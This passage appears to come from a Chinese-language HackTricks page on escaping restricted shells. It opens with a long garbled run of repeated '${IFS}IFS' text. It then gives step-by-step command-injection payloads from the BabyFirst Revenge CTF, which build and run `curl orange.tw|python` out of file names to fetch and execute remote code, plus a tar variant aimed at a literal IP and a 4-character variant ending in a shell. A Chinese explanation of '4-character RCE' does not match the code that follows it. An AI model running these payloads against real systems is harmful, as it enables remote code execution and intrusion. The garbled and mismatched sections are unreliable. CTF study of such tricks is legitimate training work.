${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4个字符的RCE

在某些情况下，我们可能会遇到只允许使用非交互式shell的限制。这种情况下，我们需要找到一种方法来绕过这个限制并执行我们的命令。下面是一种使用只有4个字符的远程代码执行（RCE）技巧。

#### 使用反引号

在Bash中，我们可以使用反引号（`）来执行命令并将其结果返回给我们。这个特性可以帮助我们绕过限制并执行我们的命令。

```bash
`<command>`
```

我们可以将任何命令放在反引号中，并将其结果分配给一个变量或直接使用它。

#### 示例

假设我们只能使用非交互式shell，并且我们想要执行`ls`命令来列出当前目录中的文件。我们可以使用反引号来绕过限制，如下所示：

```bash
`ls`
```

这将执行`ls`命令并返回结果。

#### 注意事项

- 反引号中的命令将在当前环境中执行，因此请谨慎使用。
- 请确保只执行受信任的命令，以防止潜在的安全风险。

使用这种方法时，请记住遵守法律和道德规范，并仅在合法授权的范围内使用。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 只读/Noexec/Distroless绕过

如果你在一个具有**只读和noexec保护**甚至是在一个distroless容器中，仍然有办法**执行任意二进制文件，甚至是一个shell！:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot和其他监狱绕过

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考资料和更多

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**最新版本的PEASS或下载PDF格式的HackTricks**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
